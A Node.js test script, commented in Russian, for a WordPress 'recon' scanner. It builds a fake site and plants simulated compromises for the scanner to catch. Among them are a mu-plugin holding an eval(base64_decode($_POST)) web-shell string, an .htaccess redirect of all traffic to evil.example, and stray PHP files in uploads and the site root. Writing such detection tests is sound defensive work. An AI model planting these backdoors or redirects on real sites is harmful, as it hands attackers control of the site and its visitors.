/**
 * Проверка recon на поддельном сайте (протокол local): каждая подброшенная проблема должна найтись,
 * а то, что проверить нельзя, — помечаться «НЕ проверено», а не «чисто». Нужен интернет (wordpress.org).
 * node .claude/skills/project-ops/tests/test-recon.mjs
 */
import { spawnSync } from 'node:child_process';
import { appendFileSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const SCRIPT = join( dirname( fileURLToPath( import.meta.url ) ), '..', 'scripts', 'recon.mjs' );
const base = join( tmpdir(), 'wp-template-test-recon' );
const proj = join( base, 'project' );
const remote = join( base, 'remote' );
rmSync( base, { recursive: true, force: true } );

const put = ( root, rel, text ) => {
	mkdirSync( dirname( join( root, rel ) ), { recursive: true } );
	writeFileSync( join( root, rel ), text );
};

// Оригинальная тема с wordpress.org — основа «сайта».
const THEME = 'twentytwentyfive';
const VERSION = '1.5';
mkdirSync( join( remote, 'wp-content', 'themes' ), { recursive: true } );
const res = await fetch( `https://downloads.wordpress.org/theme/${ THEME }.${ VERSION }.zip` );
if ( res.status !== 200 ) {
	console.log( `SKIP — нет доступа к wordpress.org (HTTP ${ res.status })` );
	process.exit( 0 );
}
const zip = join( base, 'theme.zip' );
writeFileSync( zip, Buffer.from( await res.arrayBuffer() ) );
spawnSync( 'tar', [ '-xf', zip, '-C', join( remote, 'wp-content', 'themes' ) ] );

put( remote, 'wp-includes/version.php', "<?php\n$wp_version = '7.0.3';\n" );
appendFileSync( join( remote, 'wp-content', 'themes', THEME, 'functions.php' ), '\n// правка прошлого разработчика\n' );
put( remote, 'wp-content/uploads/2026/10/img.php', '<?php // подброшен\n' );
put( remote, 'wp-content/uploads/cache/wpml/twig/ab/cache.php', '<?php // кеш WPML\n' );
put( remote, 'wp-content/mu-plugins/loader.php', "<?php $x = 'eval(base64_decode($_POST[\"c\"]));';\n" );
put( remote, '.htaccess', 'RewriteEngine On\nRewriteRule ^(.*)$ https://evil.example/?r=$1 [R=302,L]\n' );
put( remote, 'local-xdebuginfo.php', '<?php phpinfo();\n' );
put( remote, 'shell.php', '<?php // лишний в корне\n' );

put( proj, '.vscode/sftp.json', JSON.stringify( { protocol: 'local', remotePath: remote.replace( /\\/g, '/' ), ignore: [] } ) );
put( proj, 'ACCESS.md', '- Публичный URL: https://fake.invalid\n' );

const r = spawnSync( process.execPath, [ SCRIPT, '--deep' ], { cwd: proj, encoding: 'utf8', timeout: 300000 } );
const outText = r.stdout || '';
let fails = 0;
const check = ( name, ok ) => {
	console.log( `${ ok ? 'OK  ' : 'FAIL' } ${ name }` );
	fails += ok ? 0 : 1;
};
check( 'итог 🔴', /Итог: 🔴/.test( outText ) );
check( 'PHP в uploads найден', /🔴 uploads: PHP — wp-content\/uploads\/2026\/10\/img\.php/.test( outText ) );
check( 'кеш WPML — не тревога', ! /uploads.*cache\/wpml/.test( outText.split( 'Итог' )[ 1 ] || '' ) || /не тревога/.test( outText ) );
check( 'вредоносный mu-plugin найден', /🔴 вредоносные шаблоны: wp-content\/mu-plugins\/loader\.php/.test( outText ) );
check( 'редирект в .htaccess найден', /🔴 \.htaccess: редирект на evil\.example/.test( outText ) );
check( 'лишний PHP в корне найден', /корень сайта: PHP не из ядра — shell\.php/.test( outText ) );
check( 'local-xdebuginfo.php не тревога', ! /local-xdebuginfo/.test( outText ) );
check( 'правка темы найдена', new RegExp( `тема ${ THEME } ${ VERSION }: изменено 1.*functions\\.php` ).test( outText ) );
check( 'нечитаемое ядро — НЕ проверено, не «чисто»', /ядро: не читаются .* НЕ проверены/.test( outText ) && /лишние PHP НЕ проверены/.test( outText ) );
check( 'JSON-отчёт записан', JSON.parse( readFileSync( join( proj, '.claude', '.state', 'recon-local.json' ), 'utf8' ) ).verdict === 'red' );

if ( fails ) {
	console.log( outText );
}
console.log( fails ? `ПРОВАЛЕНО: ${ fails }` : 'Все проверки recon прошли' );
process.exit( fails ? 1 : 0 );
